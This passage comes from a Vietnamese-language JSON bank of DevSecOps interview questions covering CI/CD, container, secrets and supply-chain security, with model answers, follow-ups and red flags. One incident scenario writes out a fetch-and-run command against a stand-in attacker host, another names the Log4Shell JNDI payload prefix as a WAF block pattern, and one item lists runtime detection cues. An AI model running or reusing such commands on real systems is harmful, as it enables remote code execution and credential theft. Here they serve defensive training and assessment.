          "Hài lòng với kiến thức L1 cơ bản, ngại học các kỹ năng mới và không đóng góp cho tri thức của nhóm"
        ]
      }
    ]
  },
  {
    "role": "DevSecOps Engineer",
    "group": "cybersecurity",
    "groupLabel": "An toàn thông tin (Cybersecurity)",
    "aliases": [
      "devsecops engineer",
      "devsecops",
      "ky su devsecops",
      "devops security",
      "ci cd security",
      "security automation engineer"
    ],
    "questions": [
      {
        "id": "DEVSECOPS-FOUND-01",
        "role": "DevSecOps Engineer",
        "category": "foundation",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Trong DevSecOps Engineer, phân biệt Shift Left Security, DevSecOps Culture, SDLC Security, Security Gates; mô tả khi nào em áp dụng chúng trong bài tập.",
        "evaluationCriteria": [
          "Giải thích đúng ý nghĩa cơ bản của Shift Left Security.",
          "Phân biệt được các khái niệm liên quan DevSecOps Culture, SDLC Security, Security Gates ở mức nhập môn.",
          "Đưa ra được ví dụ học tập phù hợp với vị trí DevSecOps Engineer."
        ],
        "followUps": [
          "Nếu mới học Shift Left Security, em sẽ dùng ví dụ đơn giản nào để tự kiểm tra mình đã hiểu?"
        ],
        "tags": [
          "Shift Left Security",
          "DevSecOps Culture",
          "SDLC Security",
          "Security Gates",
          "Cost of Defects"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nhầm lẫn khái niệm nền tảng hoặc không thể đưa ra ví dụ cơ bản."
        ]
      },
      {
        "id": "DEVSECOPS-FOUND-02",
        "role": "DevSecOps Engineer",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Kiến trúc Pipeline CI/CD An toàn (Secure CI/CD Pipeline Architecture): Các mối đe dọa nhắm vào hệ thống CI/CD (Poisoned Pipeline Execution, Dependency Confusion, Secrets in Code) và biện pháp phòng thủ chiều sâu?",
        "evaluationCriteria": [
          "Poisoned Pipeline Execution (PPE): Kẻ tấn công chỉnh sửa file pipeline definition (`.github/workflows/*.yml`, `Jenkinsfile`) trong Pull Request để inject mã độc chạy với quyền hạn cao của CI/CD runner",
          "Phòng thủ: Tách biệt pipeline definition (chỉ admin merge), dùng Reusable Workflows / Shared Libraries được quản lý tập trung; chạy CI trên Runner cô lập (Ephemeral runners) bị hủy sau mỗi build",
          "Kiểm soát bí mật: Không lưu secrets trong code hay biến môi trường CI; sử dụng Vault / OIDC Token Federation để cấp quyền truy cập đám mây ngắn hạn (Short-lived credentials) cho pipeline"
        ],
        "followUps": [
          "OWASP Top 10 CI/CD Security Risks liệt kê những nguy cơ nghiêm trọng nào?",
          "Cách phát hiện và ngăn chặn một contributor bên ngoài inject mã độc vào GitHub Actions workflow?"
        ],
        "tags": [
          "Secure CI/CD",
          "Poisoned Pipeline",
          "Ephemeral Runners",
          "OIDC Federation",
          "Pipeline Hardening"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-10-ci-cd-security-risks/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cho phép bất kỳ Pull Request nào cũng tự động kích hoạt pipeline với quyền admin mà không cần review"
        ]
      },
      {
        "id": "DEVSECOPS-FOUND-03",
        "role": "DevSecOps Engineer",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Bảo mật Container và Container Image Hardening: Các nguyên tắc xây dựng Docker Image tối giản an toàn (Distroless / Scratch base images), quét lỗ hổng image (Trivy, Grype) và thực thi chính sách OPA/Gatekeeper trên Kubernetes?",
        "evaluationCriteria": [
          "Base Image tối giản: Sử dụng Google Distroless hoặc Alpine với multi-stage build để giảm bề mặt tấn công xuống mức tối thiểu; tuyệt đối không dùng base image `latest` tag",
          "Quét lỗ hổng: Tích hợp Trivy hoặc Grype vào CI để quét CVE trong các lớp image trước khi push lên Registry; thiết lập ngưỡng chặn (vd: block push nếu có CVE Critical/High chưa có bản vá)",
          "OPA Gatekeeper trên Kubernetes: Thực thi chính sách buộc mọi container phải chạy với user non-root (`runAsNonRoot: true`), cấm mount volume nhạy cảm (`/var/run/docker.sock`), và cấm chạy chế độ đặc quyền (`privileged: false`)"
        ],
        "followUps": [
          "Rootless container vs Rootless Podman: Tại sao việc chạy container hoàn toàn không cần quyền root lại an toàn hơn nhiều?",
          "Cách thiết lập Admission Controller trong Kubernetes để từ chối triển khai các image chưa được ký số?"
        ],
        "tags": [
          "Container Security",
          "Distroless Images",
          "Trivy CVE Scanning",
          "OPA Gatekeeper",
          "Non-root Containers"
        ],
        "sourceRefs": [
          "https://kubernetes.io/docs/concepts/security/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chạy toàn bộ container bằng quyền root và mount `docker.sock` vào container ứng dụng"
        ]
      },
      {
        "id": "DEVSECOPS-FOUND-04",
        "role": "DevSecOps Engineer",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Nguyên lý Hạ tầng bất biến (Immutable Infrastructure) và Hạ tầng dưới dạng mã (Infrastructure as Code - IaC Security): Cách áp dụng GitOps (ArgoCD/Flux) kết hợp với Policy-as-Code (Checkov, tfsec, OPA/Rego) để đảm bảo mọi thay đổi hạ tầng đều được kiểm soát bảo mật?",
        "evaluationCriteria": [
          "Immutable Infrastructure: Không bao giờ SSH vào server để sửa đổi thủ công; mọi thay đổi đều phải đi qua Git commit -> CI/CD pipeline -> triển khai bản mới hoàn toàn (thay thế, không vá)",
          "GitOps: ArgoCD hoặc Flux theo dõi một Git repository chứa manifests Kubernetes; mọi thay đổi cấu hình phải được Pull Request review, phê duyệt và merge; ArgoCD tự động đồng bộ trạng thái mong muốn",
          "Policy-as-Code: Chạy Checkov/tfsec trong CI quét file Terraform/CloudFormation trước khi áp dụng; OPA Rego policies kiểm tra tuân thủ nghiêm ngặt (vd: cấm tạo S3 bucket không mã hóa, cấm tạo EC2 trong Public Subnet)"
        ],
        "followUps": [
          "Configuration Drift xảy ra khi nào và Immutable Infrastructure giải quyết triệt để vấn đề này như thế nào?",
          "Cách quản lý Terraform State file an toàn (S3 backend + DynamoDB locking + KMS encryption)?"
        ],
        "tags": [
          "Immutable Infrastructure",
          "GitOps",
          "ArgoCD",
          "Policy-as-Code",
          "Checkov",
          "Configuration Drift"
        ],
        "sourceRefs": [
          "https://www.checkov.io/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "SSH trực tiếp vào máy chủ Production để sửa cấu hình thủ công mà không ghi nhận vào Git"
        ]
      },
      {
        "id": "DEVSECOPS-FOUND-05",
        "role": "DevSecOps Engineer",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Quản lý Bí mật trong DevOps (Secrets Management): Phân biệt các giải pháp HashiCorp Vault, AWS Secrets Manager, SOPS (Mozilla) và Sealed Secrets (Bitnami) cho Kubernetes?",
        "evaluationCriteria": [
          "HashiCorp Vault: Giải pháp toàn diện nhất; cung cấp Dynamic Secrets (tạo mật khẩu DB tạm thời có thời hạn), PKI engine tự cấp chứng chỉ TLS, và Transit engine mã hóa dữ liệu ứng dụng",
          "AWS Secrets Manager: Tích hợp sâu với AWS; tự động xoay vòng mật khẩu RDS/Redshift qua Lambda; truy xuất bằng AWS SDK trong code ứng dụng",
          "SOPS + Age/KMS: Mã hóa chỉ phần giá trị (value) trong file YAML/JSON cấu hình, giữ nguyên key để vẫn đọc được cấu trúc file trong Git diff; giải mã tự động trong pipeline CI/CD",
          "Sealed Secrets: Bitnami controller chạy trong Kubernetes cluster; mã hóa secret bằng public key, chỉ có controller trong cluster mới giải mã được; cho phép lưu trữ SealedSecret resource an toàn trong Git"
        ],
        "followUps": [
          "Tại sao không bao giờ được commit file `.env` chứa secrets vào Git repository dù là private?",
          "Dynamic Secrets của Vault khác gì so với Static Secrets truyền thống?"
        ],
        "tags": [
          "Secrets Management",
          "HashiCorp Vault",
          "SOPS",
          "Sealed Secrets",
          "Dynamic Secrets",
          "Secret Rotation"
        ],
        "sourceRefs": [
          "https://developer.hashicorp.com/vault/docs",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Lưu mật khẩu database và API keys dưới dạng plaintext trong file `docker-compose.yml` trên Git"
        ]
      },
      {
        "id": "DEVSECOPS-FOUND-06",
        "role": "DevSecOps Engineer",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Bảo mật Chuỗi cung ứng Phần mềm (Software Supply Chain Security): Tiêu chuẩn SLSA (Supply-chain Levels for Software Artifacts), SBOM (Software Bill of Materials) và ký số Artifact (Sigstore/Cosign)?",
        "evaluationCriteria": [
          "SLSA Framework: Bốn cấp độ trưởng thành (Level 1-4) đo lường mức độ bảo vệ quy trình xây dựng phần mềm từ nguồn mã đến artifact cuối cùng; Level 3 yêu cầu build trên hệ thống cô lập không thể can thiệp và tạo Provenance metadata (chứng nhận xuất xứ)",
          "SBOM: Tạo danh mục thành phần phần mềm (theo CycloneDX/SPDX) tại mỗi bước build; sử dụng để theo dõi liên tục các CVE mới xuất hiện trong thư viện bên thứ ba đã dùng",
          "Sigstore/Cosign: Ký số container image bằng chứng chỉ tạm thời (Keyless signing qua OIDC); Rekor Transparency Log ghi lại mọi lần ký để có thể kiểm chứng sau này"
        ],
        "followUps": [
          "Vụ tấn công SolarWinds SUNBURST là ví dụ kinh điển về Supply Chain Attack như thế nào?",
          "SLSA Level 4 yêu cầu 'Hermetic build' là gì và tại sao nó quan trọng?"
        ],
        "tags": [
          "SLSA",
          "SBOM",
          "Sigstore",
          "Cosign",
          "Supply Chain Integrity",
          "Build Provenance"
        ],
        "sourceRefs": [
          "https://slsa.dev/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không quan tâm đến nguồn gốc và tính toàn vẹn của các thư viện mã nguồn mở tải về từ Internet"
        ]
      },
      {
        "id": "DEVSECOPS-PRAC-01",
        "role": "DevSecOps Engineer",
        "category": "practical_skills",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Mô phỏng Security Pipeline (Pre-commit Hooks, SAST DAST SCA, DefectDojo, Gate Policy) cho DevSecOps Engineer: em chuẩn bị gì, thao tác nào và đo kết quả ra sao?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Security Pipeline trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Security Pipeline",
          "Pre-commit Hooks",
          "SAST DAST SCA",
          "DefectDojo",
          "Gate Policy",
          "Build Time Budget"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-devsecops-guideline/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "DEVSECOPS-PRAC-02",
        "role": "DevSecOps Engineer",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Bài tập DevSecOps Engineer: dựa trên Golden Pipeline, phối hợp Reusable Workflows, Shared Libraries, Standardization, Canary Rollout; đầu ra sẽ được kiểm tra bằng tiêu chí nào?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Golden Pipeline trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Golden Pipeline",
          "Reusable Workflows",
          "Shared Libraries",
          "Standardization",
          "Canary Rollout"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "DEVSECOPS-PRAC-03",
        "role": "DevSecOps Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Bảo mật Runtime Container và Kubernetes (Runtime Protection): Triển khai Falco hoặc Tetragon để giám sát và phát hiện hành vi bất thường (Anomaly Detection) của container trên Production?",
        "evaluationCriteria": [
          "Falco: Giám sát system calls (syscalls) của container dựa trên các luật phát hiện (Falco Rules); cảnh báo khi phát hiện hành vi bất thường (vd: container chạy shell `bash`, đọc file `/etc/shadow`, kết nối mạng ra ngoài từ container không nên có Internet)",
          "Tetragon (Cilium): Giám sát syscalls ở tầng eBPF trong kernel; hiệu năng cao hơn do xử lý trực tiếp trong kernel space mà không cần chuyển dữ liệu lên user space",
          "Tích hợp với SOC: Gửi cảnh báo Falco qua Kafka/Fluentd vào SIEM (Splunk/Sentinel) để đội SOC theo dõi; thiết lập NetworkPolicy Kubernetes cô lập tự động pod bất thường"
        ],
        "followUps": [
          "Khác biệt giữa giám sát dựa trên luật (Rule-based) và giám sát dựa trên profile hành vi (Behavioral Profiling)?",
          "Làm thế nào để xây dựng Falco rules tùy biến cho các ứng dụng đặc thù của công ty?"
        ],
        "tags": [
          "Falco",
          "Tetragon",
          "eBPF Security",
          "Runtime Protection",
          "Syscall Monitoring",
          "Container Anomaly"
        ],
        "sourceRefs": [
          "https://falco.org/docs/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Triển khai container lên Production mà không có bất kỳ cơ chế giám sát runtime nào"
        ]
      },
      {
        "id": "DEVSECOPS-PRAC-04",
        "role": "DevSecOps Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Quản lý chứng chỉ TLS tự động (Automated Certificate Management): Triển khai cert-manager trên Kubernetes với Let's Encrypt / AWS ACM và cấu hình mTLS giữa các dịch vụ nội bộ qua Service Mesh (Istio/Linkerd)?",
        "evaluationCriteria": [
          "cert-manager: Tự động yêu cầu, gia hạn và cài đặt chứng chỉ TLS từ Let's Encrypt qua ACME protocol; hỗ trợ HTTP-01 và DNS-01 challenge",
          "AWS ACM: Cấp chứng chỉ miễn phí cho các dịch vụ AWS (ALB, CloudFront, API Gateway) với tự động gia hạn; tuy nhiên không cho phép xuất private key",
          "mTLS trong Service Mesh: Istio/Linkerd tự động cấp chứng chỉ SPIFFE cho mỗi pod qua Citadel/Identity; xoay vòng chứng chỉ trong suốt (transparent rotation) mà ứng dụng không cần thay đổi code"
        ],
        "followUps": [
          "Rủi ro nghiêm trọng khi chứng chỉ TLS hết hạn trên Production và cách phòng tránh?",
          "Tại sao Wildcard certificate (`*.company.com`) lại kém an toàn hơn so với chứng chỉ riêng biệt cho từng subdomain?"
        ],
        "tags": [
          "cert-manager",
          "Let's Encrypt",
          "mTLS",
          "SPIFFE Certificates",
          "Certificate Rotation",
          "AWS ACM"
        ],
        "sourceRefs": [
          "https://cert-manager.io/docs/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Quản lý chứng chỉ TLS thủ công trên bảng tính Excel và quên gia hạn làm sập toàn bộ website"
        ]
      },
      {
        "id": "DEVSECOPS-PRAC-05",
        "role": "DevSecOps Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Xây dựng hệ thống giám sát an ninh tập trung cho DevSecOps (Security Observability): Cách thiết kế dashboard tổng hợp số liệu bảo mật từ nhiều nguồn (SAST, SCA, DAST, Container Scan, Cloud CSPM) vào một bảng điều khiển duy nhất?",
        "evaluationCriteria": [
          "Nền tảng tổng hợp: Sử dụng DefectDojo hoặc Grafana Security Dashboard để gom nhận kết quả từ các công cụ khác nhau qua API import",
          "Chỉ số cốt lõi (Key Security Metrics): Tổng số lỗ hổng theo mức độ nghiêm trọng (Critical/High/Medium/Low), Mean Time to Remediate (MTTR), Tỷ lệ SLA tuân thủ (% lỗi vá trong hạn), Số lượng secrets lộ lọt bắt được trước khi merge",
          "Cảnh báo thông minh: Thiết lập ngưỡng báo động khi số lỗi Critical mới vượt ngưỡng hàng ngày hoặc khi có container image chạy trên Production chứa CVE Critical chưa vá quá 7 ngày"
        ],
        "followUps": [
          "Tại sao việc có một 'Single Pane of Glass' cho bảo mật lại giúp CISO đưa ra quyết định nhanh hơn?",
          "Cách sử dụng các chỉ số DORA (Deployment Frequency, Lead Time, MTTR, Change Failure Rate) kết hợp với Security Metrics?"
        ],
        "tags": [
          "Security Observability",
          "DefectDojo",
          "MTTR",
          "Security Metrics",
          "DORA Metrics",
          "Grafana Dashboard"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Mỗi công cụ bảo mật có một dashboard riêng biệt mà không ai tổng hợp, dẫn đến không ai có bức tranh toàn cảnh"
        ]
      },
      {
        "id": "DEVSECOPS-PRAC-06",
        "role": "DevSecOps Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Thiết kế hệ thống Quản lý Lỗ hổng Tập trung (Vulnerability Management Program) cho tổ chức DevSecOps: Cách phân loại, gán nhãn ưu tiên (Risk-based Prioritization) và theo dõi SLA sửa lỗi giữa các đội phát triển?",
        "evaluationCriteria": [
          "Phân loại dựa trên rủi ro thực tế: Không chỉ dựa vào CVSS score; kết hợp các yếu tố: Lỗ hổng có đang bị khai thác ngoài tự nhiên không (EPSS score), tài sản bị ảnh hưởng có tiếp xúc Internet không, dữ liệu nhạy cảm nào bị đe dọa",
          "SLA Remediation: Critical (vá trong 24-48 giờ), High (7 ngày), Medium (30 ngày), Low (90 ngày); theo dõi tỷ lệ tuân thủ SLA theo từng đội và báo cáo hàng tuần",
          "Exception Management: Quy trình chấp nhận rủi ro có hạn (Risk Acceptance với thời hạn expiry) cho các trường hợp không thể vá ngay; bắt buộc có ký duyệt của Tech Lead và Security"
        ],
        "followUps": [
          "Tại sao EPSS (Exploit Prediction Scoring System) lại là bước tiến quan trọng so với chỉ dùng CVSS đơn thuần?",
          "Cách xử lý 'Alert Fatigue' khi SCA liên tục báo hàng trăm CVE nhưng hầu hết không khả dụng trong ngữ cảnh ứng dụng?"
        ],
        "tags": [
          "Vulnerability Management",
          "Risk-based Prioritization",
          "EPSS",
          "SLA Tracking",
          "Exception Management"
        ],
        "sourceRefs": [
          "https://www.first.org/epss/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Gửi danh sách 500 CVE cho đội dev yêu cầu sửa hết mà không phân loại ưu tiên theo rủi ro thực tế"
        ]
      },
      {
        "id": "DEVSECOPS-PRAC-07",
        "role": "DevSecOps Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tự động hóa phản ứng bảo mật trong CI/CD (Automated Security Response): Cách thiết kế hệ thống tự động chặn triển khai (Deployment Blocking) khi phát hiện lỗ hổng nghiêm trọng và tự động rollback khi phát hiện bất thường trên Production?",
        "evaluationCriteria": [
          "Admission Controller: Triển khai OPA Gatekeeper hoặc Kyverno làm Admission Webhook trên Kubernetes; từ chối triển khai bất kỳ image nào chưa qua quét hoặc chứa CVE Critical",
          "Automated Rollback: Kết hợp Canary Deployment (Argo Rollouts / Flagger) với các metrics an ninh; nếu rate of 4xx/5xx tăng đột biến hoặc Falco phát hiện hành vi bất thường từ phiên bản mới -> tự động rollback về phiên bản ổn định trước đó",
          "Break Glass Procedure: Cung cấp quy trình khẩn cấp cho phép deploy bỏ qua security gates trong tình huống cần hotfix gấp, nhưng bắt buộc có sự phê duyệt của Security Lead và ghi log chi tiết"
        ],
        "followUps": [
          "Rủi ro khi tự động hóa quá mức (Over-automation) trong phản ứng bảo mật?",
          "Thiết kế Break Glass sao cho vẫn đảm bảo trách nhiệm giải trình (Accountability)?"
        ],
        "tags": [
          "Admission Controller",
          "Automated Rollback",
          "Canary Deployment",
          "Break Glass",
          "Argo Rollouts"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không có cơ chế Break Glass khẩn cấp khiến đội dev bất lực khi cần deploy hotfix lúc 2 giờ sáng"
        ]
      },
      {
        "id": "DEVSECOPS-PRAC-08",
        "role": "DevSecOps Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Xây dựng Chương trình Đào tạo và Văn hóa DevSecOps (Security Culture Program): Cách triển khai Security Champions Network, Secure Coding Tournaments và Threat Modeling sprints trong các đội Agile?",
        "evaluationCriteria": [
          "Security Champions: Lựa chọn 1-2 kỹ sư/đội được đào tạo chuyên sâu về bảo mật; họ thực hiện security review PR, dẫn dắt threat modeling và là đầu mối liên lạc với đội AppSec trung tâm",
          "Gamification: Tổ chức CTF (Capture The Flag) nội bộ, giải đấu Secure Coding trên Secure Code Warrior hoặc Snyk Learn; trao giải thưởng và ghi nhận thành tích",
          "Threat Modeling as Sprint Activity: Đưa buổi threat modeling ngắn (30 phút) vào Sprint Planning hoặc Sprint 0 cho mỗi Epic/Feature mới; sử dụng STRIDE Methodology trên Whiteboard"
        ],
        "followUps": [
          "Làm thế nào để đo lường sự thay đổi văn hóa bảo mật (Security Culture Maturity) trong tổ chức?",
          "Cách duy trì động lực cho Security Champions khi họ phải gánh thêm trách nhiệm?"
        ],
        "tags": [
          "Security Champions",
          "DevSecOps Culture",
          "CTF Training",
          "Threat Modeling Sprints",
          "Gamification"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Áp đặt bảo mật từ trên xuống bằng mệnh lệnh mà không xây dựng sự đồng thuận và hứng thú từ dev"
        ]
      },
      {
        "id": "DEVSECOPS-SCEN-01",
        "role": "DevSecOps Engineer",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Tại DevSecOps Engineer, khi SAST Tuning cùng Developer Friction, Incremental Scanning, Signal-to-Noise Ratio, Stakeholder Management xuất hiện và thay đổi giao diện hoặc API tạo ra kết quả sai, em kiểm tra log hay dữ liệu nào trước?",
        "evaluationCriteria": [
          "Làm rõ hiện tượng và thu thập thông tin trước khi kết luận.",
          "Đề xuất bước xử lý ban đầu an toàn, phù hợp với Intern/Fresher trong DevSecOps Engineer.",
          "Biết xác nhận kết quả và báo người hướng dẫn khi vấn đề vượt quá phạm vi hiểu biết."
        ],
        "followUps": [
          "Em sẽ tóm tắt phát hiện và phần chưa chắc chắn với người hướng dẫn như thế nào?"
        ],
        "tags": [
          "SAST Tuning",
          "Developer Friction",
          "Incremental Scanning",
          "Signal-to-Noise Ratio",
          "Stakeholder Management"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Đưa ra hành động rủi ro, vượt quyền hoặc bỏ qua bước xác minh và báo cáo."
        ]
      },
      {
        "id": "DEVSECOPS-SCEN-02",
        "role": "DevSecOps Engineer",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Vào 23:00 tối thứ Sáu, hệ thống Snyk SCA gửi cảnh báo khẩn cấp: Thư viện `log4j-core` phiên bản 2.14.1 đang được sử dụng trong 15 microservices trên Production có lỗ hổng RCE Critical (Log4Shell CVE-2021-44228). Kẻ tấn công đã bắt đầu khai thác tràn lan trên toàn thế giới. Em triển khai kế hoạch khắc phục khẩn cấp quy mô toàn doanh nghiệp như thế nào?",
        "evaluationCriteria": [
          "Phút 0-30: Áp dụng WAF virtual patch chặn các payload `${jndi:ldap://` trên toàn bộ entry points; thiết lập outbound firewall rule chặn kết nối LDAP/RMI ra ngoài từ các server ứng dụng",
          "30 phút - 2 giờ: Sử dụng SBOM đã có sẵn hoặc chạy Trivy/Syft toàn bộ container registry để định danh chính xác 15 service nào đang dùng phiên bản lỗi; nâng cấp log4j lên phiên bản 2.17.1+ và rebuild image",
          "2 giờ - 4 giờ: Triển khai rolling update từng service với canary deployment; giám sát chặt chẽ lỗi và performance sau mỗi bản nâng cấp; kiểm tra log xem có dấu hiệu khai thác thành công trước khi vá không"
        ],
        "followUps": [
          "Tại sao việc có sẵn SBOM giúp tiết kiệm hàng giờ quý giá trong tình huống Zero-day khẩn cấp?",
          "Cách xử lý khi một trong 15 services không thể nâng cấp log4j ngay vì phụ thuộc vào framework cũ không tương thích?"
        ],
        "tags": [
          "Zero-Day Emergency",
          "Log4Shell Response",
          "WAF Virtual Patch",
          "SBOM Triage",
          "Rolling Update"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chờ đến thứ Hai tuần sau mới xử lý vì cuối tuần không có lịch bảo trì"
        ]
      },
      {
        "id": "DEVSECOPS-SCEN-03",
        "role": "DevSecOps Engineer",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Đội DevOps phát hiện một GitHub Actions workflow trong repository nội bộ đã bị kẻ tấn công chỉnh sửa (qua Pull Request từ một tài khoản nhân viên bị chiếm đoạt) để thêm bước `curl attacker.com/steal.sh | bash` chạy với GITHUB_TOKEN có quyền ghi (write). Em điều tra phạm vi ảnh hưởng và khắc phục như thế nào?",
        "evaluationCriteria": [
          "Bước 1: Vô hiệu hóa ngay lập tức GITHUB_TOKEN bị lạm dụng; kiểm tra Git commit history và audit log để xác định thời điểm chính xác workflow bị chỉnh sửa",
          "Bước 2: Kiểm tra toàn bộ các secrets có thể đã bị trích xuất trong quá trình CI chạy (AWS keys, NPM tokens, database credentials); thu hồi và xoay vòng tất cả",
          "Bước 3: Kiểm tra xem script `steal.sh` đã thực hiện hành vi gì (đọc biến môi trường, tải repository nội bộ, gửi dữ liệu ra ngoài)",
          "Bước 4: Áp dụng biện pháp phòng ngừa: Yêu cầu Code Review bắt buộc cho mọi thay đổi workflow files; giới hạn quyền GITHUB_TOKEN mặc định sang read-only; bật Branch Protection Rules"
        ],
        "followUps": [
          "Tại sao GITHUB_TOKEN mặc định trong GitHub Actions có thể trở thành vũ khí nguy hiểm nếu không giới hạn quyền?",
          "Cách thiết lập CODEOWNERS file để bảo vệ `.github/workflows/` directory?"
        ],
        "tags": [
          "CI/CD Pipeline Attack",
          "GitHub Actions Compromise",
          "Token Revocation",
          "Workflow Protection",
          "CODEOWNERS"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ xóa commit độc hại mà không kiểm tra các secrets đã bị rò rỉ trong quá trình pipeline chạy"
        ]
      },
      {
        "id": "DEVSECOPS-SCEN-04",
        "role": "DevSecOps Engineer",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Công ty quyết định chuyển từ mô hình triển khai máy ảo truyền thống sang kiến trúc Microservices chạy trên Kubernetes. Đội bảo mật chưa có kinh nghiệm với container và Kubernetes. Là DevSecOps Lead, em xây dựng lộ trình bảo mật cho quá trình chuyển đổi này như thế nào?",
        "evaluationCriteria": [
          "Giai đoạn 1 (Tháng 1-2): Thiết lập nền tảng (Foundation): Xây dựng Hardened Base Images, tích hợp Trivy vào CI/CD, thiết lập Private Container Registry với vulnerability scanning tự động",
          "Giai đoạn 2 (Tháng 3-4): Kiểm soát truy cập (Access Control): Triển khai Kubernetes RBAC, Network Policies (Default Deny), Pod Security Standards (Restricted profile)",
          "Giai đoạn 3 (Tháng 5-6): Giám sát runtime (Runtime Protection): Cài đặt Falco/Tetragon giám sát syscalls; triển khai Service Mesh (Istio) với mTLS; tích hợp cảnh báo vào SIEM",
          "Đào tạo xuyên suốt: Tổ chức workshop Kubernetes Security cho đội Dev và Ops mỗi 2 tuần"
        ],
        "followUps": [
          "Những sai lầm bảo mật phổ biến nhất khi chuyển từ VM sang Container/K8s?",
          "Cách đánh giá mức độ trưởng thành bảo mật Kubernetes (K8s Security Maturity Model)?"
        ],
        "tags": [
          "K8s Migration Security",
          "Hardened Base Images",
          "Pod Security Standards",
          "RBAC",
          "Security Roadmap"
        ],
        "sourceRefs": [
          "https://kubernetes.io/docs/concepts/security/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cho rằng Kubernetes tự động bảo mật sẵn và không cần cấu hình Network Policy hay RBAC"
        ]
      },
      {
        "id": "DEVSECOPS-SCEN-05",
        "role": "DevSecOps Engineer",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Một cuộc kiểm toán SOC 2 Type II phát hiện rằng 40% các microservices đang chạy trên Production sử dụng container image cũ hơn 6 tháng với hàng chục CVE Critical chưa vá. Kiểm toán viên yêu cầu khắc phục toàn bộ trong vòng 30 ngày. Em lập kế hoạch hành động như thế nào?",
        "evaluationCriteria": [
          "Tuần 1: Kiểm kê toàn diện (Inventory): Sử dụng Trivy/Anchore quét toàn bộ container đang chạy; phân loại theo mức độ nghiêm trọng và tác động kinh doanh; ưu tiên các services tiếp xúc Internet",
